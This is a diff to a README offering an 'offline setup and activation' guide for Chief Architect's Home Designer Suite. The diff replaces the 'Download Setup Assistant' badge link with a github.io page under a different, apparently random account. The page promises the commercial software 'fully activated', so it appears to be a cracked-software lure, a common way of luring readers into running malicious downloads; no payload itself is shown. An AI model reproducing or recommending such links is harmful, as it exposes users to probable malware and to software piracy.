@@ -1,6 +1,6 @@
 # Home Designer Suite — Offline Setup & Activation Guide
 
-[![Download Offline Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://home-designer-suite.github.io/.github)
+[![Download Offline Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matookfj.github.io/.github/homedesigner)
 
 Plan and visualize your dream home with Chief Architect’s **Home Designer Suite** — fully activated offline with this guide.
 
